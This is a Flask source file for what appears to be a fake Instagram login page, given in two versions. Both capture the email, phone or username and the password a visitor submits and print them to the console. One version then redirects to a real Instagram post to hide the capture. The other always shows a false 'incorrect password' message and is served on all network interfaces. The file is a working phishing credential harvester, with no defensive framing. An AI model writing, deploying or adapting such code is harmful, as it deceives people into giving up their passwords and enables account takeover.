# from flask import Flask, render_template, request, redirect, url_for

# app = Flask(__name__)

# @app.route('/', methods=['GET', 'POST'])
# def login():
#     if request.method == 'POST':
#         email_or_phone = request.form.get('email_or_phone')
#         password = request.form.get('password')

#         # Print email/phone and password
#         print()
#         print()
#         print("**********************")
#         print(f"Email/Phone/Username: {email_or_phone}")
#         print(f"Password: {password}")
#         print("***********************")
#         print()
#         print()

#         # Redirect to Instagram page
#         return redirect("https://www.instagram.com/p/C8QyPpVJNHm/")
    
#     return render_template('index.html')

# if __name__ == '__main__':
#     app.run(debug=True)



from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        email_or_phone = request.form.get('email_or_phone')
        password = request.form.get('password')

        # Print email/phone and password
        print()
        print()
        print("**********************")
        print(f"Email/Phone/Username: {email_or_phone}")
        print(f"Password: {password}")
        print("**********************")
        print()
        print()

        # Check credentials (for demonstration, any non-empty password is considered incorrect)
        if password != 'correct_password':  # Replace 'correct_password' with the actual correct password
            error = 'The password you entered is incorrect. Please try again.'

    return render_template('index.html', error=error)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port= 8080)
